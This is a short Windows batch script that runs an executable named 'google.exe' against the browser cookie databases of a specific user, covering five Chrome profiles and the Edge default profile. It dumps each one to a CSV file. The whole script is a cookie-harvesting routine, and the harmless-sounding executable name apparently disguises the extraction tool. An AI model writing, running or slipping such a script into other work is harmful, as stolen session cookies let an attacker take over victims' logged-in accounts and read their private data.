@echo off
cd %0\..\
%0\..\google.exe /CookiesFile  "C:\Users\MEDREAM\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"  /scomma  data_default.csv
%0\..\google.exe /CookiesFile  "C:\Users\MEDREAM\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies" /scomma  data_1.csv
%0\..\google.exe /CookiesFile  "C:\Users\MEDREAM\AppData\Local\Google\Chrome\User Data\Profile 2\Network\Cookies" /scomma  data_2.csv
%0\..\google.exe /CookiesFile  "C:\Users\MEDREAM\AppData\Local\Google\Chrome\User Data\Profile 3\Network\Cookies" /scomma   data_3.csv
%0\..\google.exe /CookiesFile  "C:\Users\MEDREAM\AppData\Local\Google\Chrome\User Data\Profile 4\Network\Cookies" /scomma   data_4.csv
%0\..\google.exe /CookiesFile  "C:\Users\MEDREAM\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies"  /scomma   data_dev.csv